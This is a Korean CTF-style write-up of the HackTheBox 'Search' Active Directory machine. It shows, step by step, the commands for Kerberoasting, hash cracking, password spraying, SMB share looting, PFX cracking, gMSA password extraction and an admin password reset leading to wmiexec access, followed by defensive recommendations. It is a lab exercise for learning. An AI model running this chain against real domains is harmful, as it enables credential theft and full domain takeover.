# HackTheBox 라이트업 - Search

> AD / Kerberoast / Password Spray / SMB 문서 분석 / PFX / PSWA / gMSA

---

## 1. 개요

HTB Search는 하나의 취약점만 터뜨리는 문제가 아니라, 작은 단서들을 계속 이어 붙여 Active Directory 권한 경로를 완성하는 머신이었다. 처음에는 웹과 SMB/LDAP/Kerberos 포트가 함께 열려 있는 전형적인 AD 환경으로 보였고, 이후 초기 계정 정보, Kerberoasting, Password Spray, SMB 공유 문서 분석, PFX 인증서, PSWA, gMSA 권한까지 이어졌다.

내가 어렵게 느낀 지점은 “다음 취약점이 무엇인지”보다 “지금 얻은 계정으로 무엇을 더 볼 수 있는지”를 계속 다시 확인해야 한다는 점이었다. 특히 Excel 파일 내부 XML, PFX 인증서, `ReadGMSAPassword` 권한은 단순 명령어 암기만으로는 연결하기 어려웠고, BloodHound 결과를 실제 PowerShell 명령으로 옮기는 과정에서 많이 배웠다.

민감한 계정명, 비밀번호, IP, flag는 포트폴리오용으로 익명화했다.

---

## 2. 대상 / 환경

| 항목 | 내용 |
| --- | --- |
| 머신 | HackTheBox Search |
| OS | Windows Server / Active Directory |
| 도메인 | `search.htb` |
| 주요 서비스 | DNS, HTTP/HTTPS, SMB, LDAP, Kerberos, PSWA |
| 핵심 흐름 | Kerberoast -> Password Spray -> SMB 문서 분석 -> PFX/PSWA -> gMSA -> 계정 제어 |

---

## 3. 공격 경로 요약

```text
Nmap 전체 포트 스캔
-> AD 서비스와 웹/PSWA 노출 확인
-> 초기 계정 단서 확보
-> LDAP/BloodHound 수집
-> Kerberoasting으로 서비스 계정 해시 획득
-> 해시 크랙 후 사용자 목록 기반 Password Spray
-> 추가 사용자 계정 획득
-> RedirectedFolders$ 공유 탐색
-> XLSX 내부 XML에서 숨겨진 인증 정보 확인
-> PFX 인증서 획득 및 크랙
-> 브라우저에 인증서 import 후 PSWA 접근
-> BloodHound에서 ReadGMSAPassword 권한 확인
-> gMSA 현재 비밀번호 추출
-> gMSA 권한으로 고권한 계정 비밀번호 재설정
-> wmiexec로 관리자 권한 획득
```

---

## 4. 정찰

### 4.1 전체 포트 스캔

```bash
nmap -Pn -n -p- --open --max-retries 1 --min-rate 1000 IP -oA scan_result
```

열린 포트만 추려 상세 스캔에 사용했다.

```bash
grep -i '/tcp' scan_result.nmap | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//'

nmap -Pn -n -sC -sV -p PORTS IP -oA nmap_full
```

### 4.2 서비스 해석

| 포트 | 서비스 | 분석 포인트 |
| --- | --- | --- |
| 53 | DNS | 내부 도메인 확인 |
| 80/443 | IIS / Web | 웹 페이지, 사용자/조직 단서, PSWA 경로 |
| 88 | Kerberos | AS-REP Roasting, Kerberoasting 가능성 |
| 389/636 | LDAP/LDAPS | 사용자, 그룹, ACL 정보 수집 |
| 445 | SMB | 공유 폴더, 리다이렉트 폴더, 문서 파일 |
| 8172 | IIS 관리 관련 서비스 | 관리 포털/운영 페이지 가능성 |

AD 포트와 웹 서비스가 동시에 열려 있었기 때문에, 단순 웹 취약점보다 “계정 단서 -> AD 열거 -> 권한 확장” 흐름으로 접근했다.

---

## 5. 초기 계정과 LDAP 수집

웹 페이지와 노출된 정보에서 초기 계정 단서를 얻었다. 이 계정은 바로 관리자 권한을 주지는 않았지만, LDAP/BloodHound 수집과 Kerberoasting을 시작할 수 있는 발판이 되었다.

```bash
ldapdomaindump -u 'search\USER' -p 'PASSWORD' IP
```

확인한 파일:

```text
domain_users.html   -> 사용자 목록, 설명 필드, 계정 활성 여부
domain_groups.html  -> 기본 그룹, 운영 그룹
domain_policy.html  -> 비밀번호 정책, 잠금 정책
*.grep              -> 터미널 기반 빠른 검색
```

초기 계정이 낮은 권한이라도 AD 환경에서는 매우 중요하다. 사용자 목록, SPN 계정, 그룹 관계, ACL 경로를 확인할 수 있기 때문이다.

---

## 6. Kerberoasting

초기 계정으로 SPN이 등록된 서비스 계정을 조회하고 TGS 해시를 요청했다.

```bash
impacket-GetUserSPNs -request -dc-ip IP \
  search.htb/USER:'PASSWORD' -outputfile kerb_hashes.txt
```

이후 hashcat Kerberos TGS 모드로 크랙했다.

```bash
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
```

Kerberoasting은 서비스 계정의 비밀번호가 약할 때 다음 계정으로 확장할 수 있는 중요한 단계다. 여기서는 크랙된 비밀번호가 이후 Password Spray로 이어졌다.

---

## 7. 사용자 목록 기반 Password Spray

BloodHound나 LDAP dump에서 활성 사용자 목록을 추출한 뒤, 크랙된 비밀번호를 전체 사용자에게 무차별 조합하지 않고 한 번씩만 시도했다.

```bash
cat export.csv | grep -i '@' | cut -d '@' -f 1 | tr '[:upper:]' '[:lower:]' > domain_users.txt

kerbrute passwordspray -d search.htb --dc IP domain_users.txt 'CRACKED_PASSWORD'
```

SMB 인증 성공 여부도 별도로 확인했다.

```bash
while read u; do
  smbmap -u "$u" -p 'CRACKED_PASSWORD' -d search -H IP --no-banner --no-color
done < domain_users.txt | tee spray_results.txt
```

### 학습 포인트

Password Spray는 brute force와 다르다. 하나의 비밀번호를 여러 사용자에게 낮은 빈도로 시도해 계정 잠금 위험을 줄이는 방식이다. 실습 환경에서도 이 차이를 명확히 이해하고 기록했다.

---

## 8. SMB RedirectedFolders$ 탐색

새로 얻은 계정으로 SMB 공유를 확인했다.

```bash
smbmap -u USER -p 'PASSWORD' -d search -H IP
smbclient '//IP/RedirectedFolders$' -U 'USER%PASSWORD'
```

`RedirectedFolders$`는 사용자별 Desktop/Documents가 중앙 공유로 리다이렉트된 구조였다. 이런 공유에서는 다음 파일을 우선 확인했다.

```text
Desktop / Documents
-> xlsx, docx, txt, config, pfx, kdbx
-> 숨겨진 시트, 내부 XML, 인증서, 백업 파일
```

---

## 9. XLSX 내부 XML 분석

공유 폴더에서 발견한 Excel 파일은 화면에 보이는 값만 확인해서는 충분하지 않았다. XLSX는 ZIP 컨테이너이므로 압축을 풀고 내부 XML을 직접 확인했다.

```bash
mkdir xlsx_extract
unzip suspicious.xlsx -d xlsx_extract
cd xlsx_extract
cat xl/worksheets/sheet2.xml
```

이 과정에서 숨겨진 값과 추가 계정 단서를 확인했다. 이 단계가 어려웠던 이유는 “Excel 파일을 열어본다”에서 끝내지 않고, 파일 포맷 구조까지 내려가야 했기 때문이다.

---

## 10. PFX 인증서와 PSWA 접근

추가 계정으로 SMB 공유를 다시 탐색하면서 PFX 인증서를 확보했다.

```bash
pfx2john staff.pfx > staff.hash
john --wordlist=/usr/share/wordlists/rockyou.txt staff.hash
```

PFX 비밀번호를 크랙한 뒤 브라우저에 인증서를 import했다.

```text
Firefox
-> Settings
-> Privacy & Security
-> Certificates
-> View Certificates
-> Your Certificates
-> Import staff.pfx
```

이후 PSWA(PowerShell Web Access)에 접근했다.

```text
https://IP/staff/en-US/console.aspx
```

### 학습 포인트

PFX는 단순한 파일이 아니라 “클라이언트 인증이 필요한 페이지로 들어가는 열쇠”가 될 수 있다. 웹 페이지 접근 권한과 AD 계정 권한이 결합되는 지점이었다.

---

## 11. BloodHound 경로 분석

PSWA를 통해 확보한 PowerShell 세션과 BloodHound 결과를 연결해 권한 경로를 확인했다.

```cypher
MATCH (s:User {name:'USER@SEARCH.HTB'}), (da:Group {name:'DOMAIN ADMINS@SEARCH.HTB'})
MATCH p = shortestPath((s)-[*1..]->(da))
RETURN p
```

핵심 경로는 다음과 같았다.

```text
사용자 계정
-> [ReadGMSAPassword]
gMSA 계정
-> [고권한 계정 제어 가능]
관리자 그룹
```

`ReadGMSAPassword`는 이름만 보면 단순 조회 권한처럼 보이지만, 실제로는 gMSA의 현재 비밀번호를 읽어 해당 서비스 계정 권한으로 행동할 수 있게 만드는 강한 권한이었다.

---

## 12. gMSA 비밀번호 추출

PSWA PowerShell 세션에서 gMSA 객체의 `msDS-ManagedPassword` 속성을 읽었다.

```powershell
$gmsa = Get-ADServiceAccount -Identity 'GMSA_NAME' -Properties 'msds-managedpassword'
$mp = $gmsa.'msds-managedpassword'
$mp1 = ConvertFrom-ADManagedPasswordBlob $mp

$user = 'GMSA_NAME$'
$passwd = $mp1.'CurrentPassword'
$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $user,$secpass
```

`ConvertFrom-ADManagedPasswordBlob`은 기본 PowerShell 명령이 아닐 수 있으므로 DSInternals나 관련 함수 로드가 필요하다.

---

## 13. 계정 비밀번호 재설정과 관리자 접근

gMSA 권한으로 고권한 계정의 비밀번호를 재설정했다.

```powershell
Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {
    Set-ADAccountPassword -Identity TARGET_USER -Reset `
      -NewPassword (ConvertTo-SecureString -AsPlainText 'NEW_PASSWORD' -Force)
} -Credential $cred
```

Kali에서 원격 명령 실행을 시도했다.

```bash
impacket-wmiexec 'SEARCH/TARGET_USER:NEW_PASSWORD@IP'
```

권한 확인:

```cmd
whoami
cd \Users\Administrator\Desktop
dir
```

---

## 14. 영향도

| 구분 | 내용 |
| --- | --- |
| 초기 침투 | 웹/문서에 노출된 계정 단서로 AD 인증 시작 |
| 계정 확장 | Kerberoast와 Password Spray로 추가 계정 확보 |
| 내부 정보 노출 | RedirectedFolders$에 민감 파일과 인증서 존재 |
| 권한 상승 | `ReadGMSAPassword`로 gMSA 자격 증명 확보 |
| 최종 영향 | 고권한 계정 제어 및 도메인 장악 가능 |

---

## 15. 어려웠던 지점

- 초기 계정 하나를 얻은 뒤 바로 shell로 이어지는 문제가 아니라 LDAP, BloodHound, SPN, SMB를 계속 다시 확인해야 했다.
- Excel 파일은 UI가 아니라 내부 XML까지 확인해야 숨겨진 단서를 찾을 수 있었다.
- PFX 인증서는 “크랙할 파일”이면서 동시에 “웹 접근을 위한 클라이언트 인증 수단”이었다.
- BloodHound의 `ReadGMSAPassword` edge를 실제 PowerShell 명령으로 옮기는 과정이 가장 어려웠다.
- Search는 AD 라이트업 중에서도 단계가 길어서, 각 계정이 어떤 권한을 제공하는지 표로 정리해야 흐름이 보였다.

---

## 16. 대응 방안

- 웹 페이지, 이미지, 문서에 계정명/비밀번호 단서가 노출되지 않도록 배포 전 점검한다.
- SPN 서비스 계정은 강한 비밀번호 또는 gMSA를 사용하고 Kerberoast 가능 계정을 주기적으로 점검한다.
- Password Spray 탐지를 위해 Kerberos/SMB 실패 이벤트를 모니터링한다.
- 사용자 리다이렉트 공유에 인증서, 설정 파일, 비밀번호 문서를 저장하지 않는다.
- PFX 인증서는 강한 비밀번호와 별도 보관 정책을 적용한다.
- BloodHound로 `ReadGMSAPassword`, `GenericAll`, `ForceChangePassword` 경로를 정기 감사한다.
- gMSA 읽기 권한은 실제 서비스 운영에 필요한 계정과 서버로 최소화한다.

---

## 17. 학습한 점

- AD 문제에서는 “계정 하나 획득”이 끝이 아니라 LDAP/SMB/BloodHound/SPN 확인의 시작점이다.
- XLSX, PFX처럼 평범한 파일이 공격 경로의 핵심이 될 수 있다.
- BloodHound 결과는 그래프에서 끝내지 말고, 각 edge가 실제 어떤 명령과 권한 행위로 연결되는지 해석해야 한다.
- 긴 AD 체인은 명령어보다 “계정 -> 권한 -> 다음 계정” 관계를 정리하는 능력이 더 중요하다.
